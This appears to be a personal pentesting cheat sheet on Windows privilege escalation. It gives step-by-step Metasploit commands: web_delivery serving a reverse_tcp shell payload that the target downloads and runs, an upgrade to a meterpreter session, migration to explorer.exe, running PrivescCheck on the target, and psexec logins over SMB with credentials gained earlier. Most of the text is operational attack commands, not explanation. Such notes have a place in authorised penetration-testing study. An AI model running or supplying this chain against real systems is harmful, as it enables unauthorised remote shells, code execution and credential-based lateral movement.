In order to elevate your privs on Windows, you must first identify priv escalation vulnerabilities that exist on the target system.

This process will differ greatly based on the type of target you gain access to. Priv esc on Windows can be performed through a plethora of techniques based on the version of Windows and the systems unique config.

This process can be quite tedious and time consuming and as a result it is recommended to automate the process of identifying priv esc vuln with scripts.

PrivesCheck - Aims to enumerate common Windows config issues that can be leveraged for local priv esc. It also gathers various info that might be useful for exploit and or post-exploit.

multi/script/web_delivery (good module that will fire up a webserver serving a payload, and will download and execute on a target machine)

set target PSH\ (Binary)  (Use auto tab completion to see options)
set payload windows/shell/reverse_tcp
set PSH-EncodedCommand false
run (this will generate code, you will want to run this on the targets command prompt)

**You should get a command prompt session that you can upgrade to meterpreter**
post/multi/manage/shell_to_meterpreter
show advanced
set WIN_TRANSFER VBS
set SESSION
**ensure port doesnt conflict with the original session port**
**You should now get a meterpreter session, make sure you migrate to explorer.exe**

cd C:\\
cd Users
cd <username>
cd Desktop
cd PrivescCheck (You will need to have the whole privescheck folder on the target system)
**Run the appropriate command from the github to start the checks**

**With admin creds on a Windows system here is how you switch over and finally elevate your privs**

**Psexec to be ran on your machine, this is like SSH, PSexec authenticates to the windows system via SMB**
psexec.py <user-to-authenticate-as>@<target-ip>
<password prompt>
<connection started>
whoami
whoami /priv

**This can also be done within metasploit framework**
use exploit/windows/smb/psexec
**ensure port doesnt conflict with sessions**
**set the SMB user / pass to the account you want to authenticate with and or the credentials you gained prior**
exploit
sysinfo
getuid



